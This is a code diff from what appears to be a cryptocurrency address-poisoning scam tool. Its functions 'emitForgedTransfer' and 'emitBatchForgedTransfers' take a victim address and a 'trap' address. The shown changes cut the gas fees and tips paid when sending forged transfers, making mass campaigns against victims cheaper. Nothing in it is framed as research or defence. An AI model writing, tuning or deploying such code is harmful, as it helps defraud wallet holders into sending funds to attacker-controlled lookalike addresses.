@@ -1051,9 +1051,9 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     const nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 CHEAPEST POSSIBLE GAS: Fetch accurate fees, ignore RPC glitches
-    let maxFeePerGas = 3000000000n; // 3 gwei ceiling (You won't actually pay this, it's just a safety cap)
-    let maxPriorityFeePerGas = 500000000n; // 0.5 gwei tip (Very cheap miner incentive)
+    // 🚀 ULTRA-CHEAP GAS: Match the low fees of single transactions
+    let maxFeePerGas = 2000000000n; // 2 gwei ceiling
+    let maxPriorityFeePerGas = 10000000n; // 🚀 0.01 gwei tip (Matches your cheap single txs!)
 
     try {
       const feeData = await client.estimateFeesPerGas();
@@ -1061,15 +1061,13 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
       let networkMaxFee = feeData.maxFeePerGas || 0n;
       let networkTip = feeData.maxPriorityFeePerGas || 0n;
 
-      // If the RPC returns garbage where tip > maxFee (the exact error you got)
-      // or if the maxFee is suspiciously close to 0 (less than 0.5 gwei)
-      if (networkTip >= networkMaxFee || networkMaxFee < 500000000n) {
-        // Ignore the garbage, use our cheap defaults
-        logger.debug(`[mirror] RPC returned glitchy fees (Max: ${networkMaxFee}, Tip: ${networkTip}). Using cheap defaults.`);
+      // If RPC returns garbage, ignore it and use our ultra-cheap defaults
+      if (networkTip >= networkMaxFee || networkMaxFee < 100000000n) {
+        logger.debug(`[mirror] RPC returned glitchy fees. Using ultra-cheap defaults.`);
       } else {
-        // Valid data! Use it, but add a tiny 10% buffer to maxFee to account for base fee spikes
+        // Use network data, but hard-cap the tip at 0.05 gwei to prevent overpaying
         maxFeePerGas = networkMaxFee + (networkMaxFee / 10n);
-        maxPriorityFeePerGas = networkTip;
+        maxPriorityFeePerGas = networkTip < 50000000n ? networkTip : 50000000n; // Max 0.05 gwei tip
       }
     } catch (e) {
       logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
@@ -1333,9 +1331,9 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     const nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 CHEAPEST POSSIBLE GAS: Fetch accurate fees, ignore RPC glitches
-    let maxFeePerGas = 3000000000n; // 3 gwei ceiling (You won't actually pay this, it's just a safety cap)
-    let maxPriorityFeePerGas = 500000000n; // 0.5 gwei tip (Very cheap miner incentive)
+    // 🚀 ULTRA-CHEAP GAS: Match the low fees of single transactions
+    let maxFeePerGas = 2000000000n; // 2 gwei ceiling
+    let maxPriorityFeePerGas = 10000000n; // 🚀 0.01 gwei tip (Matches your cheap single txs!)
 
     try {
       const feeData = await client.estimateFeesPerGas();
@@ -1343,11 +1341,11 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
       let networkMaxFee = feeData.maxFeePerGas || 0n;
       let networkTip = feeData.maxPriorityFeePerGas || 0n;
 
-      if (networkTip >= networkMaxFee || networkMaxFee < 500000000n) {
-        logger.debug(`[batch] RPC returned glitchy fees (Max: ${networkMaxFee}, Tip: ${networkTip}). Using cheap defaults.`);
+      if (networkTip >= networkMaxFee || networkMaxFee < 100000000n) {
+        logger.debug(`[batch] RPC returned glitchy fees. Using ultra-cheap defaults.`);
       } else {
         maxFeePerGas = networkMaxFee + (networkMaxFee / 10n);
-        maxPriorityFeePerGas = networkTip;
+        maxPriorityFeePerGas = networkTip < 50000000n ? networkTip : 50000000n; // Max 0.05 gwei tip
       }
     } catch (e) {
       logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
